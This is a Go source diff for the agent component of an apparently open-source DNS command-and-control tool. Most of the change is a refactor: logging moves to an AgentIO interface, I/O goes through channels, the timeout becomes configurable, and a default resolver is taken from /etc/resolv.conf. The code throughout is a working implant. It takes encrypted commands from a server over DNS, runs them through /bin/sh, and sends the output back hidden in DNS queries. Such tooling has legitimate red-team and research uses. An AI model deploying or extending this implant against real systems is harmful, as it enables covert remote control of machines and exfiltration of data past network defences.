@@ -1,31 +1,43 @@
 package agent
 
 import (
-	"bufio"
 	"bytes"
 	"context"
 	"encoding/binary"
 	"errors"
 	"fmt"
-	"os"
 	"os/exec"
 	"strings"
 	"time"
 
+	"github.com/miekg/dns"
 	"github.com/mosajjal/dnspot/c2"
 	"github.com/mosajjal/dnspot/cryptography"
-	log "github.com/sirupsen/logrus"
 )
 
 var Config struct {
 	CommandTimeout        time.Duration
-	LogLevel              uint8
 	PrivateKeyBase36      string
 	privateKey            *cryptography.PrivateKey
 	ServerAddress         string
 	ServerPublicKeyBase36 string
 	serverPublicKey       *cryptography.PublicKey
 	DnsSuffix             string
+	io                    AgentIO
+}
+
+const (
+	DEBUG = uint8(iota)
+	INFO
+	WARN
+	ERR
+	FATAL
+)
+
+type AgentIO interface {
+	Logger(level uint8, format string, args ...interface{})
+	GetInputFeed() chan string
+	GetOutputFeed() chan string
 }
 
 var exiting chan bool
@@ -50,11 +62,11 @@ func ResetAgent() {
 func runCommand(command string, cmdType c2.CmdType, timestamp uint32) {
 	switch cmdType {
 	case c2.CommandExec:
-		log.Info("Running command: ", command)
+		Config.io.Logger(INFO, "Running command: ", command)
 
 		// Create a new context and add a timeout to it
-		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second) //todo: timeout should probably be configurable
-		defer cancel()                                                          // The cancel should be deferred so resources are cleaned up
+		ctx, cancel := context.WithTimeout(context.Background(), Config.CommandTimeout) //todo: timeout should probably be configurable
+		defer cancel()                                                                  // The cancel should be deferred so resources are cleaned up
 
 		cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)
 
@@ -62,11 +74,11 @@ func runCommand(command string, cmdType c2.CmdType, timestamp uint32) {
 		AgentStatus.NextMessageType = c2.MessageExecuteCommandResponse
 		AgentStatus.NextPayload = out
 		if err != nil {
-			log.Warnf("Error in running command %s: %s", cmd, err)
+			Config.io.Logger(WARN, "Error in running command %s: %s", cmd, err)
 			cancel()
 		}
 	case c2.CommandEcho:
-		fmt.Printf("[SERVER AT %v]: %s\n", time.Unix(int64(timestamp), 0), command)
+		Config.io.GetOutputFeed() <- fmt.Sprintf("[SERVER AT %v]: %s", time.Unix(int64(timestamp), 0), command)
 		AgentStatus.NextMessageType = c2.MessageExecuteCommandResponse
 		AgentStatus.NextPayload = []byte("msg delivered")
 	}
@@ -92,7 +104,7 @@ func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
 	}
 	command := msgList[0] // todo: handle multiple commands at the same time?
 	AgentStatus.LastAckFromServer = command.Msg.TimeStamp
-	log.Infof("got message from Server: Type: %v, Payload: %s", command.Msg.MessageType, command.Msg.Payload) //todo: act on server's command here
+	Config.io.Logger(INFO, "got message from Server: Type: %v, Payload: %s", command.Msg.MessageType, command.Msg.Payload) //todo: act on server's command here
 
 	// execution for last/single packets
 	switch msgType := command.Msg.MessageType; msgType {
@@ -117,17 +129,17 @@ func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
 				AgentStatus.NextMessageType = c2.MessageHealthcheck
 			}
 			payload := []byte("Ack!")
-			// log.Infof("sending plyload %#v\n", msg)
+			// Config.io.Logger(INFO,"sending plyload %#v\n", msg)
 			// time.Sleep(2 * time.Second)
 			Questions, _, err := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Config.serverPublicKey)
 			for _, Q := range Questions {
 				err = SendQuestionToServer(Q)
 				if err != nil {
-					log.Infof("Error sending Message to Server: %s", err)
+					Config.io.Logger(INFO, "Error sending Message to Server: %s", err)
 				}
 			}
 			if err != nil {
-				log.Warnf("Error sending Message to Server: %s", err)
+				Config.io.Logger(WARN, "Error sending Message to Server: %s", err)
 			}
 			if !command.Msg.IsLastPart {
 				return nil
@@ -135,7 +147,7 @@ func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
 		}
 		fullPayload, err := grabFullPayload(PacketBuffersWithSignature[int(command.Msg.ParentPartID)])
 		if err != nil {
-			log.Warnf("error grabbing full payload: %s", err)
+			Config.io.Logger(WARN, "error grabbing full payload: %s", err)
 		}
 		runCommand(string(fullPayload), command.Msg.Command, command.Msg.TimeStamp)
 		// AgentStatus.NextMessageType = c2.MessageHealthcheck
@@ -143,20 +155,20 @@ func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
 
 	case c2.MessageExecuteCommandResponse:
 		if command.Msg.IsLastPart || command.Msg.ParentPartID == 0 {
-			log.Infof("got last part of command response") //todo: remove
+			Config.io.Logger(INFO, "got last part of command response") //todo: remove
 			ResetAgent()
 		}
 		return nil
 	case c2.MessageSetHealthInterval:
-		log.Infof("Received command to explicitly set the healthcheck interval in milliseconds")
+		Config.io.Logger(INFO, "Received command to explicitly set the healthcheck interval in milliseconds")
 		// the time interval is packed in the lower 4 bytes of the message
 		AgentStatus.HealthCheckInterval = time.Duration(binary.BigEndian.Uint32(command.Msg.Payload[0:4])) * time.Millisecond
 		AgentStatus.MessageTicker = time.NewTicker(time.Duration(AgentStatus.HealthCheckInterval) * time.Millisecond)
 		return nil
 	case c2.MessageSyncTime:
 		// throwing a warning for out of sync time for now
-		log.Warnf("Time is out of Sync.. not touching system time but please go and fix it!")
-		log.Warnf("UTC time coming from the server: %s", command.Msg.Payload)
+		Config.io.Logger(WARN, "Time is out of Sync.. not touching system time but please go and fix it!")
+		Config.io.Logger(WARN, "UTC time coming from the server: %s", command.Msg.Payload)
 		return nil
 	}
 
@@ -168,7 +180,7 @@ func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
 // this will not disrupt the flow of healthcheck messages coming from the agent
 // and those message should be dismissed on the server side during this transmission
 func SendMessageToServer(msg string) {
-	log.Infoln("sending message to server")
+	Config.io.Logger(INFO, "sending message to server")
 	AgentStatus.NextMessageType = c2.MessageExecuteCommandResponse
 	AgentStatus.NextPayload = []byte(msg)
 }
@@ -202,24 +214,28 @@ func sendHealthCheck() error {
 	payload := []byte("Ping!")
 	Questions, _, err := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Config.serverPublicKey)
 	if err != nil {
-		log.Warnf("Error sending Message to Server: %s", err)
+		Config.io.Logger(WARN, "Error sending Message to Server: %s", err)
 	}
 	for _, Q := range Questions {
 		err = SendQuestionToServer(Q)
 		if err != nil {
-			log.Warnf("Error sending Healthcheck: %s", err)
+			Config.io.Logger(WARN, "Error sending Healthcheck: %s", err)
 		}
 	}
 	return nil
 }
 
-func RunAgent() {
-	log.SetLevel(log.Level(Config.LogLevel))
-	if Config.LogLevel >= uint8(log.DebugLevel) {
-		log.SetReportCaller(true)
+func RunAgent(serverIo AgentIO) {
+	Config.io = serverIo
+	if Config.ServerAddress == "" {
+		systemDNS, _ := dns.ClientConfigFromFile("/etc/resolv.conf")
+		if len(systemDNS.Servers) < 1 {
+			Config.io.Logger(FATAL, "could not determine OS's default resolver. Please manually specify a DNS server")
+		}
+		Config.ServerAddress = systemDNS.Servers[0] + ":53"
 	}
 
-	log.Infof("Starting agent...")
+	Config.io.Logger(INFO, "Starting agent...")
 
 	// for start, we'll do a healthcheck every 10 second, and will wait for server to change this for us
 	AgentStatus.HealthCheckInterval = 3 * time.Second //todo:make this into a config parameter
@@ -236,37 +252,29 @@ func RunAgent() {
 	var err error
 	// generate a new private key if the user hasn't provided one
 	if Config.privateKey == nil {
-		log.Infoln("generating a new key pair for the agent since it was not specified")
+		Config.io.Logger(INFO, "generating a new key pair for the agent since it was not specified")
 		if Config.privateKey, err = cryptography.GenerateKey(); err != nil {
-			log.Fatalln("failed to generate a key for client")
+			Config.io.Logger(FATAL, "failed to generate a key for client")
 		}
 	} else {
 		if Config.privateKey, err = cryptography.PrivateKeyFromString(Config.PrivateKeyBase36); err != nil {
-			log.Fatalln("failed to generate a key for client")
+			Config.io.Logger(FATAL, "failed to generate a key for client")
 		}
 	}
 
 	// extract the public key from the provided Base32 encoded string
 	if Config.serverPublicKey, err = cryptography.PublicKeyFromString(Config.ServerPublicKeyBase36); err != nil {
-		log.Fatalln("failed to generate a key for client")
+		Config.io.Logger(FATAL, "failed to generate a key for client")
 	}
 
 	// start the agent by sending a healthcheck
 	if err := sendHealthCheck(); err != nil {
-		log.Warnln(err)
+		Config.io.Logger(WARN, "%s", err)
 	}
+
 	go func() {
-		reader := bufio.NewReader(os.Stdin)
-		for {
-			fmt.Print("-> ")
-			text, _ := reader.ReadString('\n')
-			// convert CRLF to LF
-			text = strings.Replace(text, "\n", "", -1)
-			if err != nil {
-				log.Errorln("can't find a key to send a message to")
-			} else {
-				SendMessageToServer(text)
-			}
+		for text := range Config.io.GetInputFeed() {
+			SendMessageToServer(text)
 		}
 	}()
 
@@ -278,7 +286,7 @@ func RunAgent() {
 		case <-AgentStatus.MessageTicker.C:
 			if AgentStatus.NextMessageType == c2.MessageHealthcheck {
 				if err := sendHealthCheck(); err != nil {
-					log.Warnln(err)
+					Config.io.Logger(WARN, "%s", err)
 				}
 			}
 			if AgentStatus.NextMessageType == c2.MessageExecuteCommandResponse {
@@ -289,12 +297,12 @@ func RunAgent() {
 				payload := []byte(AgentStatus.NextPayload)
 				Questions, _, err := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Config.serverPublicKey)
 				if err != nil {
-					log.Warnf("Error sending Message to Server 1") //todo:update msg
+					Config.io.Logger(WARN, "Error sending Message to Server 1") //todo:update msg
 				}
 				for _, Q := range Questions {
 					err = SendQuestionToServer(Q)
 					if err != nil {
-						log.Infof("Error sending Message to Server 2: %s", err) //todo:update msg
+						Config.io.Logger(INFO, "Error sending Message to Server 2: %s", err) //todo:update msg
 					}
 				}
 			}
